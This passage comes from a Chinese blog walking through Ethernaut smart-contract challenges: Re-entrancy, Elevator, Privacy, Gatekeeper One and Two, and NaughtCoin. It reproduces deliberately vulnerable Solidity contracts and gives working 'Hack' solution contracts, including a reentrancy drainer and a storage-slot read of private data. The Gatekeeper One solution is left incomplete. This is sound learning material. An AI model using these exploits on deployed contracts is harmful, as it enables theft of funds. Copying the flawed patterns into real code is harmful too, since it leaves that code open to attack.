<p>在min(1e18,address(target).balance)中，我们每次获取目标的金额进行判断，在其未归零前都可以进行取款操作。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>  Reentrance private target;<br>  constructor(address _target) &#123;<br>    target = Reentrance(_target);<br>  &#125;<br><br>  function attack() external payable &#123;<br>    target.donate&#123;value: 1e18&#125;(address(this));<br>    target.withdraw(1e18);<br>  &#125;<br><br>  receive() external payable &#123;<br>    uint amount = min(1e18,address(target).balance);<br>    if (amount &gt; 0) &#123;<br>      target.withdraw(amount);<br>    &#125;<br>  &#125;<br><br>  function min(uint x,uint y) private pure returns (uint) &#123;<br>    return x &lt;= y ? x : y;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>重入的关键：发送完成后才进行了sender的balances更新</p>
<hr>
<h1 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h1><p>这个电梯不让你到达顶楼，想办法到达顶楼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>interface Building &#123;<br>  function isLastFloor(uint) external returns (bool);<br>&#125;<br><br><br>contract Elevator &#123;<br>  bool public top;<br>  uint public floor;<br><br>  function goTo(uint _floor) public &#123;<br>    Building building = Building(msg.sender);<br><br>    if (! building.isLastFloor(_floor)) &#123;<br>      floor = _floor;<br>      top = building.isLastFloor(floor);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>该题提供了一个接口Building，我们执行goTo()方法时，在Elevator合约中将在我们的地址上执行接口，接着该接口又会调用isLastFloor函数两次，为了执行判断内语句，第一次isLastFloor返回的结果要求False，接着第二次调用返回的结果需要是True。因此我们只需要实现一个能够在两次调用中实现相反输出的isLastFloor函数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>    Elevator private target;<br>    bool private b = true;<br><br>    constructor (address _target) &#123;<br>      target = Elevator(_target);<br>    &#125;<br><br>    function isLastFloor(uint) external returns(bool) &#123;<br>        b = !b;<br>        return b;<br>    &#125;<br>    <br>    function pwn() public &#123;<br>        target.goTo(1); //输入的数并不最要<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<hr>
<h1 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h1><p>任务要求：解锁合约。</p>
<p><strong>源代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Privacy &#123;<br><br>  bool public locked = true;<br>  uint256 public ID = block.timestamp;<br>  uint8 private flattening = 10;<br>  uint8 private denomination = 255;<br>  uint16 private awkwardness = uint16(block.timestamp);<br>  bytes32[3] private data;<br><br>  constructor(bytes32[3] memory _data) &#123;<br>    data = _data;<br>  &#125;<br>  <br>  function unlock(bytes16 _key) public &#123;<br>    require(_key == bytes16(data[2]));<br>    locked = false;<br>  &#125;<br><br>  /*<br>    A bunch of super advanced solidity algorithms...<br><br>      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`<br>      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,<br>      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\<br>      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)<br>      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU<br>  */<br>&#125;<br></code></pre></td></tr></table></figure>
<p>合约部署需要一个包含3个<code>bytes32</code>元素的数组。而在solidity中是无法直接传递固定大小的数组，可以猜测实例是通过另一个合约协助部署的类似于：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract PrivacyDeployer &#123;<br>    Privacy public privacyInstance;<br><br>    constructor() &#123;<br>        // Example data for _data parameter<br>        bytes32[3] memory data = [<br>            bytes32(&quot;Some data 1&quot;),<br>            bytes32(&quot;Some data 2&quot;),<br>            bytes32(&quot;Some data 3&quot;)<br>        ];<br>        <br>        privacyInstance = new Privacy(data);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>接着要使<code>locked</code>改变，只有调用<code>unlock</code>函数，提供一个<code>bytes16</code>的<code>_key</code>且与<code>_data</code>数组的第三个参数匹配。</p>
<p>简单回顾一下智能合约中状态变量是如何存储的：</p>
<p>在合约内部定义状态变量的顺序决定了变量存储在EVM中的字节值。每个slot能存储32字节的数据，在没存储满时允许不超过剩余存储字节的变量接着往后存储。不然开辟新的slot空间存储变量。</p>
<p>在本题中，首先定义了一个bool变量，占slot0的位置。接下来uint256的ID一共32字节因此在slot1的位置；接着是两个1字节和一个2字节的uint变量都位于slot2的位置，于是bytes32数组的存储位置便在slot3、slot4、slot5。</p>
<p>而unlock需要的参数便是数组的第三个参数即slot5存储的数据，我们直接用web3中提供的方法获取到便行。然后截取前16字节。</p>
<p><code>web3.eth.getStorageAt(&quot;youraddr&quot;,5)</code>然后<code>.slice(0,34)</code>因为前两位是0x，同是2字符表示1字节，<code>16*2+2=34</code>。</p>
<hr>
<h1 id="Gatekeeper-One"><a href="#Gatekeeper-One" class="headerlink" title="Gatekeeper One"></a>Gatekeeper One</h1><p>任务要求：成为entrant</p>
<p><strong>源代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract GatekeeperOne &#123;<br><br>  address public entrant;<br><br>  modifier gateOne() &#123;<br>    require(msg.sender != tx.origin);<br>    _;<br>  &#125;<br><br>  modifier gateTwo() &#123;<br>    require(gasleft() % 8191 == 0);<br>    _;<br>  &#125;<br><br>  modifier gateThree(bytes8 _gateKey) &#123;<br>      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);<br>      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);<br>      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);<br>    _;<br>  &#125;<br><br>  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;<br>    entrant = tx.origin;<br>    return true;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>要成为entrant，我们只有调用<code>enter</code>方法且满足<code>gateOne</code>，<code>gateTwo</code>，<code>gateThree</code>三个修饰符。现在让我们逐步分析三个修饰符：</p>
<ul>
<li><code>gateOne</code>：要求调用者不是合约本身，即<code>msg.sender</code>必须不等于<code>tx.origin</code>。因此，我们需要使用一个外部地址来调用合约的<code>enter</code>函数。</li>
<li><code>gateTwo</code>：要求当前交易的剩余燃气量（gasleft()）必须是 8191 的倍数。</li>
<li><code>gateThree</code>：传入一个<code>bytes8</code>类型的<code>_gateKey</code>参数。<ul>
<li>第一个条件要求<code>_gateKey</code>的低 32 位等于其低 16 位。</li>
<li>第二个条件要求<code>_gateKey</code>的低 32 位不等于其低 64 位。</li>
<li>第三个条件要求<code>_gateKey</code>的低 32 位等于调用者的低 20 位。</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>  function enter(address _target) public &#123;<br>    GatekeeperOne target = GatekeeperOne(_target);<br>    <br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<h1 id="Gatekeeper-Tow"><a href="#Gatekeeper-Tow" class="headerlink" title="Gatekeeper Tow"></a>Gatekeeper Tow</h1><p><strong>源代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract GatekeeperTwo &#123;<br><br>  address public entrant;<br><br>  modifier gateOne() &#123;<br>    require(msg.sender != tx.origin);<br>    _;<br>  &#125;<br><br>  modifier gateTwo() &#123;<br>    uint x;<br>    assembly &#123; x := extcodesize(caller()) &#125;<br>    require(x == 0);<br>    _;<br>  &#125;<br><br>  modifier gateThree(bytes8 _gateKey) &#123;<br>    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);<br>    _;<br>  &#125;<br><br>  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;<br>    entrant = tx.origin;<br>    return true;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h1 id="NaughtCoin"><a href="#NaughtCoin" class="headerlink" title="NaughtCoin"></a>NaughtCoin</h1><p>通过转移走合约中的所有余额来完成此关。</p>
<p><strong>源代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>import &#x27;openzeppelin-contracts-08/token/ERC20/ERC20.sol&#x27;;<br><br> contract NaughtCoin is ERC20 &#123;<br><br>  // string public constant name = &#x27;NaughtCoin&#x27;;<br>  // string public constant symbol = &#x27;0x0&#x27;;<br>  // uint public constant decimals = 18;<br>  uint public timeLock = block.timestamp + 10 * 365 days;<br>  uint256 public INITIAL_SUPPLY;<br>  address public player;<br><br>  constructor(address _player) <br>  ERC20(&#x27;NaughtCoin&#x27;, &#x27;0x0&#x27;) &#123;<br>    player = _player;<br>    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));<br>    // _totalSupply = INITIAL_SUPPLY;<br>    // _balances[player] = INITIAL_SUPPLY;<br>    _mint(player, INITIAL_SUPPLY);<br>    emit Transfer(address(0), player, INITIAL_SUPPLY);<br>  &#125;<br>  <br>  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;<br>    super.transfer(_to, _value);<br>  &#125;<br><br>  // Prevent the initial owner from transferring tokens until the timelock has passed<br>  modifier lockTokens() &#123;<br>    if (msg.sender == player) &#123;<br>      require(block.timestamp &gt; timeLock);<br>      _;<br>    &#125; else &#123;<br>     _;<br>    &#125;<br>  &#125; <br>&#125; <br></code></pre></td></tr></table></figure>
<p>合约导入了ERC20，所以对于代币的转移除了重写的transfer还有transfrom方法，只需要注意transfrom函数还需要额外的操作：approve</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/04/01/Capture-the-Ether/">← Next Capture-the-Ether</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/12/26/SprintBoot/SpringAOP/">SpringAOP Prev →</a></div></div></div></div><div id="bottom-btn"><a id="to-index" href="#toc-div" title="INDEX">≡</a><a id="to-top" onClick="scrolls.scrolltop();" title="to top" style="opacity: 0; display: none;">∧</a></div></article><aside><div id="aside-top"><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Lexlady</a></h1><div id="description"></div></div><div id="aside-block"><div id="toc-div"><h1>INDEX</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Hello-Ethernaut"><span class="toc-number">1.</span> <span class="toc-text">Hello Ethernaut</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fallback"><span class="toc-number">2.</span> <span class="toc-text">Fallback</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fallout"><span class="toc-number">3.</span> <span class="toc-text">Fallout</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Coin-Flip"><span class="toc-number">4.</span> <span class="toc-text">Coin Flip</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Telephone"><span class="toc-number">5.</span> <span class="toc-text">Telephone</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A%E5%9C%A8remix%E4%B8%8A%E9%83%A8%E7%BD%B2%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%90%88%E7%BA%A6%EF%BC%8C%E9%80%9A%E8%BF%87%E8%AF%A5%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8%E5%AE%9E%E4%BE%8B%E4%B8%AD%E7%9A%84%E6%96%B9%E6%B3%95%E6%94%B9%E5%8F%98owner"><span class="toc-number">5.1.</span> <span class="toc-text">参考：在remix上部署另一个合约，通过该合约调用实例中的方法改变owner12345contract Hack {  constructor(address _addr) {    Telephone(_addr).changeOwner(msg.sender);  }}</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Token"><span class="toc-number">6.</span> <span class="toc-text">Token</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Delegation"><span class="toc-number">7.</span> <span class="toc-text">Delegation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Force"><span class="toc-number">8.</span> <span class="toc-text">Force</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Vault"><span class="toc-number">9.</span> <span class="toc-text">Vault</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#King"><span class="toc-number">10.</span> <span class="toc-text">King</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Re-entrancy"><span class="toc-number">11.</span> <span class="toc-text">Re-entrancy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Elevator"><span class="toc-number">12.</span> <span class="toc-text">Elevator</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privacy"><span class="toc-number">13.</span> <span class="toc-text">Privacy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Gatekeeper-One"><span class="toc-number">14.</span> <span class="toc-text">Gatekeeper One</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Gatekeeper-Tow"><span class="toc-number">15.</span> <span class="toc-text">Gatekeeper Tow</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NaughtCoin"><span class="toc-number">16.</span> <span class="toc-text">NaughtCoin</span></a></li></ol></div></div></div><footer><nobr>published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknight</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{code.findCode();mermaid.init(undefined, ('.mermaid'));}</script><script src="/js/arknights.js"></script><script>window.addEventListener("load",()=>{reset()})</script></body></html>